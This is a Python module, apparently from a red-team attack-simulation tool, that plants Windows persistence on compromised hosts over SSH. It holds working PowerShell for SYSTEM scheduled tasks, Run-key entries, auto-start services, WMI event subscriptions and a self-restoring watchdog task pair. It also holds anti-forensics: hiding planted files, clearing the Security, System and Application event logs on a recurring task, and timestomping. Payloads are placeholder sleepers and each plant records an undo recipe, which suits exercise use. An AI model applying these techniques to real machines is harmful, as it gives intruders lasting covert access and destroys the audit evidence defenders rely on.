"""persist_windows — the Windows mechanics behind `persist`, one handler per family.

`persist.py` owns the registry entry, the family choice, the naming draw, the
record and the bookkeeping. This module owns the MECHANICS: what is actually
planted on a Windows box and how it is taken back off. The contract between the
two is exactly two names:

    FAMILIES : {family_name: handler_fn}
    apply(ctx, ip, family, names) -> Result

Three rules this module obeys (each one is a v1 lesson):

* **The script's exit code is the proof.** Every handler installs *and* verifies
  inside one round trip and exits non-zero when the artifact is not standing, so
  a plant that did not land is ``ok=False`` and never enters the artifact list
  ("recorded what the install did", never what a later check-in claimed).
* **Re-assertion is idempotent.** Every install is written so that running it
  twice re-asserts the existing artifact (``-Force``, ``Set-WmiInstance`` on a
  keyed instance, or an explicit ``if standing -> config else -> create``
  branch) instead of creating a second one, and the world record is not
  duplicated either. v1's families were create-only: the second plant either
  failed outright or left two artifacts behind.
* **Every artifact carries a ``check_cmd`` and a ``restore`` recipe** rendered
  from the same derived names. ``run.py``'s verify loop re-runs ``check_cmd``
  through the *legacy* Windows wrap (``ssh(..., windows=True)`` ->
  ``winexec.wrap``), so a ``check_cmd`` must be a single, double-quote-free
  line — asserted in this module's tests with ``winexec.assert_shippable``.

Every command that goes over the wire is composed here by ``exec/winexec.py``
and nothing else: ``ps()`` (EncodedCommand, base64/UTF-16LE) is used for all of
them because every plant in this module is a multi-statement, quote-heavy
script and the legacy ``-Command "<line>"`` wrap cannot carry a quote at all
(the landing shell is cmd.exe, and ``winexec`` asserts the invariant).

One deliberate split on "payload": a helper ``.cmd`` we *drop* gets a batch
body (v1's ``ping -n 600 127.0.0.1 >nul``), while a command line **Windows
itself evaluates** (a Run value, a WMI consumer's CommandLineTemplate, a
watchdog payload's argv) is ``SLEEP_CMDLINE`` — built by winexec, so the
quoting decision is never made by hand.
"""

import re

from ..exec import winexec
from .base import Result, can_root

TIMEOUT = 90

# The bland batch body of every helper .cmd we drop (v1's exact body).
SLEEP_CMD_BODY = "ping -n 600 127.0.0.1 >nul"

# A command line Windows evaluates by itself. Composed through winexec: one
# argument, no quoting left to get wrong inside a registry value or an argv.
SLEEP_CMDLINE = winexec.ps("Start-Sleep 600")

# The two Run-key locations (the mechanism, not one of our names): the machine
# hive, and the default-profile hive so every NEW profile inherits the entry.
HKLM_RUN = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
HKU_DEFAULT_RUN = ("Registry::HKEY_USERS\\.DEFAULT\\Software\\Microsoft"
                   "\\Windows\\CurrentVersion\\Run")

# Trailing verdict of a one-statement install: the exit code is the proof.
VERIFY_TAIL = "if ($?) { exit 0 } else { exit 1 }"

# Concrete Windows paths inside a detail string (fallback only: v2 artifacts
# carry `paths`, which is what hide/timestomp read first).
_WIN_PATH_RE = re.compile(r"([A-Za-z]:\\[\w\\.+@-]{2,})")


# -- the handler contract ------------------------------------------------------

def apply(ctx, ip, family, names):
    """Plant (or re-assert) one Windows family. Never raises: a transport or
    box failure is ``ok=False`` with the reason, so one bad family cannot poison
    anything else (the caller runs one family per call)."""
    fh = ctx.world.foothold(ip)
    if not fh:
        return Result(False, f"persist_windows: no foothold on {ip}")
    if not fh.get("windows"):
        return Result(False, f"persist_windows: {ip} is not a Windows foothold")
    if not _admin(fh):
        return Result(False, f"persist_windows: {family} on {ip} needs an "
                             "Administrator foothold — escalate first")
    handler = FAMILIES.get(family)
    if handler is None:
        return Result(False, f"persist_windows: no such family {family!r} "
                             f"(have {sorted(FAMILIES)})")
    try:
        return handler(ctx, ip, fh, names or {})
    except Exception as exc:            # transport blowups, box weirdness
        return Result(False, f"persist_windows {family} on {ip}: "
                             f"{type(exc).__name__}: {exc}")


# -- plumbing ------------------------------------------------------------------

def _admin(fh):
    """Administrator on Windows is admin-equivalent: no privesc path exists for
    a plant, the session itself is the privilege."""
    return bool(can_root(fh) or str((fh or {}).get("user", "")).lower()
                in ("administrator", "admin"))


def _send(ctx, ip, fh, script, timeout=TIMEOUT):
    """One Windows round trip, always as EncodedCommand (``winexec.ps``)."""
    return ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                       winexec.ps(script), timeout=timeout,
                       key_path=fh.get("key_path"))


def _why(rc, out, err):
    text = (err or "").strip() or (out or "").strip()
    return f"rc={rc}" + (f": {text[:200]}" if text else "")


def _recorded(ctx, ip, kind, name=None):
    """The world row for this artifact, if we already planted it.

    Idempotency, second half: a repeat run must be ``ok=True`` *and* must not
    append a duplicate row. The install command is idempotent on the box (that
    is the first half); this keeps the record singular.
    """
    for artifact in ctx.world.artifacts(ip):
        if artifact.get("kind") != kind:
            continue
        if name is None or f"id={name}" in (artifact.get("detail") or ""):
            return artifact
    return None


def _done(ctx, ip, kind, name, detail, check_cmd, paths, recipe, note=None):
    """The single success exit: verify that passed -> artifact + undo recipe.

    `detail` always ends in ``id=<name>``: ``state.world.artifact_key`` derives
    a per-instance key from ``id=`` in the detail, which is what lets the
    dead-artifact / re-plant logic tell two plants of one kind apart.
    """
    if note:
        ctx.world.note(ip, note)
    restore = {"recipe": list(recipe), "secrets": None}
    if _recorded(ctx, ip, kind, name) is not None:
        return Result(True, f"{kind} on {ip}: re-asserted (already recorded as "
                            f"{name}) — no duplicate artifact",
                      data={"reasserted": True}, restore=restore)
    return Result(True, detail,
                  artifacts=[{"ip": ip, "kind": kind, "detail": detail,
                              "check_cmd": check_cmd, "paths": list(paths)}],
                  restore=restore)


def _planted_paths(ctx, ip):
    """Concrete filesystem paths of everything we have planted on this box.

    Reads the artifact's recorded ``paths`` first: v1 described its Windows
    plants in prose ("task TzNetUpdate") and scraped paths back out of the
    detail, so hide/timestomp found nothing on a Windows box and reported
    "nothing planted" on every plant. The scrape stays as a fallback.
    """
    paths = set()
    for artifact in ctx.world.artifacts(ip):
        paths.update(artifact.get("paths") or [])
        paths.update(_WIN_PATH_RE.findall(artifact.get("detail") or ""))
    return sorted(paths)


def _array(paths):
    """A PowerShell array literal of single-quoted paths (no double quotes:
    these strings also end up inside check_cmds, which ride the legacy wrap)."""
    return ",".join("'" + p + "'" for p in paths)


def _maint_path(names):
    """The re-clear helper for logwipe, derived from the family's own draw."""
    return f"C:\\Windows\\System32\\{names['stem']}-maint.cmd"


# -- the families --------------------------------------------------------------
# Order inside AUTO_ORDER_WINDOWS first (that is the "auto" walk), then the two
# extra v1 mechanisms that the order does not name but that the auto walk still
# offers once the ordered families are all standing.

def scheduled_task(ctx, ip, fh, names):
    """A SYSTEM-class scheduled task that keeps our helper .cmd alive.

    v1's mechanism verbatim — ``schtasks /Create /TN <name> /SC MINUTE /MO 15
    /RU SYSTEM`` — with ``/F`` doing the work v1 left undone: a second plant
    re-asserts the same task instead of failing on "already exists" or leaving
    two tasks behind. The ``/Query`` tail is the proof, and blue's undo is one
    ``schtasks /Delete``.
    """
    task, script = names["task"], names["script"]
    ps = (f"Set-Content -Path '{script}' -Value '{SLEEP_CMD_BODY}' -Encoding ascii; "
          f"schtasks /Create /TN '{task}' /TR '{script}' "
          "/SC MINUTE /MO 15 /RU SYSTEM /F; "
          f"schtasks /Query /TN '{task}' >$null; {VERIFY_TAIL}")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"scheduled_task on {ip}: {_why(rc, out, err)}")
    detail = f"scheduled task {task} (SYSTEM, every 15 min) runs {script} id={task}"
    return _done(ctx, ip, "persist-scheduled-task", task, detail,
                 f"schtasks /Query /TN '{task}' >$null; {VERIFY_TAIL}",
                 [script],
                 [f"schtasks /Delete /TN '{task}' /F",
                  f"Move-Item -Path '{script}' -Destination '{script}.tlaloc-bak' -Force"])


def defrun(ctx, ip, fh, names):
    """``HKU\\.DEFAULT\\...\\Run``: every NEW user profile inherits red's entry.

    v1's mechanism and v1's bug fix both kept: the default-profile hive ships NO
    Run key and ``New-ItemProperty`` refuses a missing parent (rc=1 — the reason
    this family never planted in v1), so the key is created first, ``-Force``
    making that idempotent.
    """
    value = names["run_value"]
    ps = (f"$p = '{HKU_DEFAULT_RUN}'; "
          "New-Item -Path $p -Force | Out-Null; "
          f"New-ItemProperty -Path $p -Name '{value}' -Value '{SLEEP_CMDLINE}' "
          "-PropertyType String -Force | Out-Null; "
          f"$v = (Get-ItemProperty -Path $p -ErrorAction SilentlyContinue).{value}; "
          "if ($v) { exit 0 } else { exit 1 }")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"defrun on {ip}: {_why(rc, out, err)}")
    detail = (f"HKU .DEFAULT Run value {value} (new profiles inherit it) "
              f"id={value}")
    check = (f"if ((Get-ItemProperty '{HKU_DEFAULT_RUN}').{value}) "
             "{ exit 0 } else { exit 1 }")
    return _done(ctx, ip, "persist-defrun", value, detail, check, [],
                 [f"Remove-ItemProperty -Path '{HKU_DEFAULT_RUN}' "
                  f"-Name '{value}' -Force"])


def runkey(ctx, ip, fh, names):
    """``HKLM\\...\\Run``: the box re-plants us at every logon.

    v1's flagship Windows mechanism, unchanged in location, with the value name
    drawn from the naming pool (v1's fixed value name was the giveaway) and a
    real verification instead of v1's ``$?`` after an ``Out-Null`` — which reads
    the pipe's exit code and is true whatever the write did.
    """
    value = names["run_value"]
    ps = (f"New-ItemProperty -Path '{HKLM_RUN}' -Name '{value}' "
          f"-Value '{SLEEP_CMDLINE}' -PropertyType String -Force | Out-Null; "
          f"$v = (Get-ItemProperty -Path '{HKLM_RUN}' "
          f"-ErrorAction SilentlyContinue).{value}; "
          "if ($v) { exit 0 } else { exit 1 }")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"runkey on {ip}: {_why(rc, out, err)}")
    detail = f"HKLM Run value {value} -> sleeper on logon id={value}"
    check = (f"if ((Get-ItemProperty '{HKLM_RUN}').{value}) "
             "{ exit 0 } else { exit 1 }")
    return _done(ctx, ip, "persist-runkey", value, detail, check, [],
                 [f"Remove-ItemProperty -Path '{HKLM_RUN}' -Name '{value}' -Force"])


def service(ctx, ip, fh, names):
    """A bland auto-start service backed by a no-space helper .cmd.

    ``sc.exe create <name> binPath= <script> start= auto`` is v1's mechanism.
    The branch is the re-assert half: ``create`` on an existing service fails
    (rc=1073), so a second plant goes through ``sc.exe config`` and touches
    nothing else.
    """
    svc, script = names["service"], names["script"]
    ps = (f"Set-Content -Path '{script}' -Value '{SLEEP_CMD_BODY}' -Encoding ascii; "
          f"if (Get-Service -Name '{svc}' -ErrorAction SilentlyContinue) {{ "
          f"sc.exe config '{svc}' binPath= '{script}' start= auto | Out-Null }} "
          f"else {{ sc.exe create '{svc}' binPath= '{script}' start= auto | Out-Null }}; "
          f"sc.exe start '{svc}' | Out-Null; "
          f"sc.exe query '{svc}' >$null; {VERIFY_TAIL}")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"service on {ip}: {_why(rc, out, err)}")
    detail = f"auto-start service {svc} runs {script} id={svc}"
    check = f"sc.exe query '{svc}' >$null; {VERIFY_TAIL}"
    return _done(ctx, ip, "persist-service", svc, detail, check, [script],
                 [f"sc.exe stop '{svc}'",
                  f"sc.exe delete '{svc}'",
                  f"Move-Item -Path '{script}' -Destination '{script}.tlaloc-bak' -Force"])


def wmisub(ctx, ip, fh, names):
    """A permanent WMI event subscription: filter + CommandLineEventConsumer +
    binding, v1's mechanism unchanged.

    It survives reboots and most cleanup sweeps because the instances live in
    ``root\\subscription`` where blue rarely looks, and re-assertion is free:
    ``__EventFilter``/``CommandLineEventConsumer`` are keyed on Name+Namespace,
    so ``Set-WmiInstance`` updates the instance it already owns instead of
    creating a second one.
    """
    wmi, script = names["wmi"], names["script"]
    ps = (f"Set-Content -Path '{script}' -Value '{SLEEP_CMD_BODY}' -Encoding ascii; "
          "$f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
          f"-Arguments @{{Name='{wmi}';EventNamespace='root\\cimv2';"
          "QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent "
          "WITHIN 300 WHERE TargetInstance ISA Win32_LocalTime'}; "
          "$c = Set-WmiInstance -Namespace root\\subscription "
          "-Class CommandLineEventConsumer -Arguments "
          f"@{{Name='{wmi}';CommandLineTemplate='{script}'}}; "
          "Set-WmiInstance -Namespace root\\subscription "
          "-Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} "
          "| Out-Null; "
          "if (Get-WmiObject -Namespace root\\subscription -Class __EventFilter "
          f"| Where-Object {{ $_.Name -eq '{wmi}' }}) {{ exit 0 }} else {{ exit 1 }}")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"wmisub on {ip}: {_why(rc, out, err)}")
    detail = (f"WMI __EventFilter/CommandLineEventConsumer {wmi} -> {script} "
              f"id={wmi}")
    check = ("Get-WmiObject -Namespace root\\subscription -Class __EventFilter "
             f"| Where-Object {{ $_.Name -eq '{wmi}' }} "
             "| ForEach-Object { exit 0 }; exit 1")
    recipe = [
        "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding "
        f"| Where-Object {{ $_.Consumer -match '{wmi}' }} | Remove-WmiObject",
        "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer "
        f"| Where-Object {{ $_.Name -eq '{wmi}' }} | Remove-WmiObject",
        "Get-WmiObject -Namespace root\\subscription -Class __EventFilter "
        f"| Where-Object {{ $_.Name -eq '{wmi}' }} | Remove-WmiObject",
        f"Move-Item -Path '{script}' -Destination '{script}.tlaloc-bak' -Force",
    ]
    return _done(ctx, ip, "persist-wmisub", wmi, detail, check, [script], recipe)


def watchpair(ctx, ip, fh, names):
    """A mutual watchdog pair (SharpWatchdogs, pure PowerShell).

    Two SYSTEM tasks run one shared helper that re-registers BOTH tasks and
    restarts BOTH payloads, so a piecemeal cleanup is undone within a minute:
    blue has to unregister both tasks in the same pass, then the helper
    directory. v1's fixed names (``TzHelpMon``/``TzHelpUpd`` in
    ``C:\\ProgramData\\Microsoft\\Help``) are exactly the giveaway this rewrite
    removes — the directory, the helper, the tasks and the payload copies are
    all derived from this plant's own draw.

    Payloads are copies of ``$env:ComSpec`` under the task names (v1's trick: a
    live process whose image name means nothing), started on a sleeper argv.
    """
    t1, t2 = names["task"], names["log_task"]
    root = f"C:\\ProgramData\\Microsoft\\{names['service']}"
    helper = f"{root}\\{names['stem']}-watch.ps1"
    p1, p2 = f"{root}\\{t1}.exe", f"{root}\\{t2}.exe"

    lines = [
        f"$dir = '{root}'",
        f"$pair = @{{ '{t1}' = '{t1}.exe'; '{t2}' = '{t2}.exe' }}",
        "foreach ($t in @($pair.Keys)) {",
        "  if (-not (Get-ScheduledTask -TaskName $t -ErrorAction Ignore)) {",
        "    $arg = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ' "
        f"+ '{helper}'",
        "    $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arg",
        "    $trg = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) "
        "-RepetitionInterval (New-TimeSpan -Minutes 1) "
        "-RepetitionDuration (New-TimeSpan -Days 3650)",
        "    Register-ScheduledTask -TaskName $t -Action $act -Trigger $trg "
        "-User 'SYSTEM' -RunLevel Highest -Force | Out-Null",
        "  }",
        "}",
        "foreach ($exe in @($pair.Values)) {",
        "  $name = [IO.Path]::GetFileNameWithoutExtension($exe)",
        "  if (-not (Get-Process -Name $name -ErrorAction Ignore)) {",
        "    Start-Process -FilePath (Join-Path $dir $exe) "
        f"-ArgumentList '/c {SLEEP_CMDLINE}' -WindowStyle Hidden",
        "  }",
        "}",
    ]
    # The helper ships as an array of single-quoted lines (v1's form): the
    # script is written BY PowerShell, so embedded quotes get doubled.
    body = ",".join("'" + line.replace("'", "''") + "'" for line in lines)

    ps = (f"$d = '{root}'; "
          f"if ((Get-ScheduledTask -TaskName '{t1}' -ErrorAction Ignore) -and "
          f"(Get-ScheduledTask -TaskName '{t2}' -ErrorAction Ignore)) {{ exit 0 }}; "
          "New-Item -ItemType Directory -Force -Path $d | Out-Null; "
          f"Copy-Item -Path $env:ComSpec -Destination '{p1}' -Force; "
          f"Copy-Item -Path $env:ComSpec -Destination '{p2}' -Force; "
          f"$L = @({body}); "
          f"Set-Content -Path '{helper}' -Value $L -Encoding ascii; "
          f"& '{helper}'; "
          f"if ((Get-ScheduledTask -TaskName '{t1}' -ErrorAction Ignore) -and "
          f"(Get-ScheduledTask -TaskName '{t2}' -ErrorAction Ignore)) {{ exit 0 }} "
          "else { exit 1 }")
    rc, out, err = _send(ctx, ip, fh, ps, timeout=120)
    if rc != 0:
        return Result(False, f"watchpair on {ip}: {_why(rc, out, err)}")
    detail = (f"mutual watchdog tasks {t1}/{t2} -> {helper} "
              f"(payloads {p1}, {p2}) id={t1}")
    check = (f"if ((Get-ScheduledTask {t1} -EA 0) -and "
             f"(Get-ScheduledTask {t2} -EA 0)) {{ exit 0 }} else {{ exit 1 }}")
    recipe = [
        f"Unregister-ScheduledTask -TaskName '{t1}' -Confirm:$false; "
        f"Unregister-ScheduledTask -TaskName '{t2}' -Confirm:$false   "
        "# BOTH in one pass: either task alone re-creates the other",
        f"Get-Process -Name {t1},{t2} -ErrorAction SilentlyContinue | Stop-Process -Force",
        f"Move-Item -Path '{root}' -Destination '{root}.tlaloc-bak' -Force",
    ]
    note = (f"watchpair {t1}/{t2}: recovery = unregister BOTH tasks in the same "
            f"pass, stop the payload processes, then move {root} aside "
            "(the helper re-creates whichever task is missing within a minute)")
    return _done(ctx, ip, "persist-watchpair", t1, detail, check,
                 [helper, p1, p2], recipe, note=note)


def hide(ctx, ip, fh, names):
    """``attrib +h +s`` over everything we planted (v1's hiding technique).

    The point is that a directory listing and a "recently modified" sweep both
    come back clean, so the payloads survive a casual hunt; unhiding is one
    ``attrib -h -s``, which is what the recipe records. Paths come from the
    artifacts' own ``paths`` (see ``_planted_paths``).
    """
    paths = _planted_paths(ctx, ip)
    if not paths:
        return Result(False, f"hide on {ip}: nothing planted to hide")
    ps = ("$ok = 0; "
          f"foreach ($p in @({_array(paths)})) {{ "
          "if (Test-Path $p) { attrib +h +s $p; "
          "if ((Get-Item $p -Force).Attributes.ToString().Contains('Hidden')) "
          "{ Write-Output ('HIDDEN|' + $p); $ok++ } } }; "
          "if ($ok -gt 0) { exit 0 } else { exit 1 }")
    rc, out, err = _send(ctx, ip, fh, ps)
    hidden = [line.split("|", 1)[1] for line in (out or "").splitlines()
              if line.startswith("HIDDEN|")]
    if rc != 0 or not hidden:
        return Result(False, f"hide on {ip}: {_why(rc, out, err)}")
    detail = (f"attrib +h +s on {len(hidden)} planted file(s): "
              f"{', '.join(hidden)} id=hide-{names['stem']}")
    check = " -and ".join(
        f"(Get-Item '{p}' -Force).Attributes.ToString().Contains('Hidden')"
        for p in hidden)
    check = f"if ({check}) {{ exit 0 }} else {{ exit 1 }}"
    return _done(ctx, ip, "persist-hide", f"hide-{names['stem']}", detail, check,
                 hidden, [f"attrib -h -s {p}" for p in hidden])


def logwipe(ctx, ip, fh, names):
    """Clear Security/System/Application, then leave a SYSTEM task that keeps
    clearing them (v1's ``wevtutil`` mechanism, same three logs, same 30-minute
    re-clear via a helper .cmd).

    The cleared logs themselves are NOT recoverable — they are gone. The
    artifact is the re-clear task: stopping it stops the bleeding, and the undo
    recipe says so honestly rather than pretending the events come back.
    """
    task, helper = names["log_task"], _maint_path(names)
    body = "wevtutil cl Security & wevtutil cl System & wevtutil cl Application"
    ps = ("wevtutil cl Security; wevtutil cl System; wevtutil cl Application; "
          f"Set-Content -Path '{helper}' -Value '{body}' -Encoding ascii; "
          f"schtasks /Create /TN '{task}' /TR '{helper}' /SC MINUTE /MO 30 "
          "/RU SYSTEM /F; "
          f"schtasks /Query /TN '{task}' >$null; {VERIFY_TAIL}")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"logwipe on {ip}: {_why(rc, out, err)}")
    detail = (f"Security/System/Application cleared; task {task} re-clears every "
              f"30 min via {helper} id={task}")
    check = f"schtasks /Query /TN '{task}' >$null; {VERIFY_TAIL}"
    recipe = [
        f"schtasks /Delete /TN '{task}' /F",
        f"Move-Item -Path '{helper}' -Destination '{helper}.tlaloc-bak' -Force",
        "# the cleared Security/System/Application records are unrecoverable — "
        "restore them from the team's log collector",
    ]
    return _done(ctx, ip, "persist-logwipe", task, detail, check, [helper], recipe)


def timestomp(ctx, ip, fh, names):
    """Stamp our artifacts with a system-plausible timestamp.

    v1 matched them to a fixed reference file (``System32\\ntdll.dll``); here the
    reference is the Windows directory's own creation time — the same technique
    with no ported literal path. The pre-stamp ticks of every file are captured
    in the SAME round trip, so the restore recipe is exact instead of nominal:
    ticks are integers, so the recipe survives locale and formatting.
    """
    paths = _planted_paths(ctx, ip)
    if not paths:
        return Result(False, f"timestomp on {ip}: nothing planted to stamp")
    ps = ("$r = (Get-Item $env:SystemRoot).CreationTime; $n = 0; "
          f"foreach ($p in @({_array(paths)})) {{ "
          "$i = Get-Item -Force $p -ErrorAction SilentlyContinue; "
          "if ($i) { Write-Output ('TS|' + $p + '|' + $i.CreationTime.Ticks "
          "+ '|' + $i.LastWriteTime.Ticks + '|' + $i.LastAccessTime.Ticks); "
          "$i.CreationTime = $r; $i.LastWriteTime = $r; $i.LastAccessTime = $r; "
          "$n++ } }; "
          "if ($n -gt 0) { exit 0 } else { exit 1 }")
    rc, out, err = _send(ctx, ip, fh, ps)
    stamped = []
    for line in (out or "").splitlines():
        if not line.startswith("TS|"):
            continue
        parts = line.split("|")
        if len(parts) == 5:
            stamped.append(parts[1:])
    if rc != 0 or not stamped:
        return Result(False, f"timestomp on {ip}: {_why(rc, out, err)}")
    recipe = []
    for path, created, written, accessed in stamped:
        recipe.append(f"(Get-Item '{path}').CreationTime = [datetime]::new({created})")
        recipe.append(f"(Get-Item '{path}').LastWriteTime = [datetime]::new({written})")
        recipe.append(f"(Get-Item '{path}').LastAccessTime = [datetime]::new({accessed})")
    detail = (f"timestamps matched to the system reference on {len(stamped)} "
              f"planted file(s) id=timestomp-{names['stem']}")
    # The artifact is "these files no longer look recently touched" — the check
    # is honestly that, not a byte comparison.
    check = ("if ("
             + " -and ".join(f"(Get-Item '{p}').LastWriteTime -lt "
                             "(Get-Date).AddDays(-7)" for p, _, _, _ in stamped)
             + ") { exit 0 } else { exit 1 }")
    return _done(ctx, ip, "persist-timestomp", f"timestomp-{names['stem']}",
                 detail, check, [p for p, _, _, _ in stamped], recipe)


def decoy(ctx, ip, fh, names):
    """An obvious bait service that absorbs blue's cleanup (v1's decoy).

    ``sc.exe create <name> binPath= C:\\Windows\\System32\\cmd.exe type= own
    start= auto`` with an obviously malicious description: the point is that it
    IS found, so the effort spent on it is effort not spent on the real family.
    Re-assertion goes through ``sc.exe config`` (create on an existing service
    fails).
    """
    name = names["decoy_service"]
    ps = (f"if (Get-Service -Name '{name}' -ErrorAction SilentlyContinue) {{ "
          f"sc.exe config '{name}' binPath= C:\\Windows\\System32\\cmd.exe "
          "start= auto | Out-Null } "
          f"else {{ sc.exe create '{name}' binPath= C:\\Windows\\System32\\cmd.exe "
          "type= own start= auto | Out-Null }; "
          f"sc.exe description '{name}' Backdoor agent | Out-Null; "
          f"sc.exe start '{name}' | Out-Null; "
          f"sc.exe query '{name}' >$null; {VERIFY_TAIL}")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"decoy on {ip}: {_why(rc, out, err)}")
    detail = f"decoy service {name} (obvious bait implant) id={name}"
    check = f"sc.exe query '{name}' >$null; {VERIFY_TAIL}"
    return _done(ctx, ip, "persist-decoy", name, detail, check, [],
                 [f"sc.exe stop '{name}'",
                  f"sc.exe delete '{name}'"])


# The families `persist.auto_order(windows=True)` walks, in that order, then the
# extra v1 mechanisms. The values are the handlers above; `persist.py` owns the
# choice, this map owns the mechanics.
FAMILIES = {
    "scheduled_task": scheduled_task,
    "defrun": defrun,
    "runkey": runkey,
    "service": service,
    "wmisub": wmisub,
    "watchpair": watchpair,
    "hide": hide,
    "logwipe": logwipe,
    "timestomp": timestomp,
    "decoy": decoy,
}
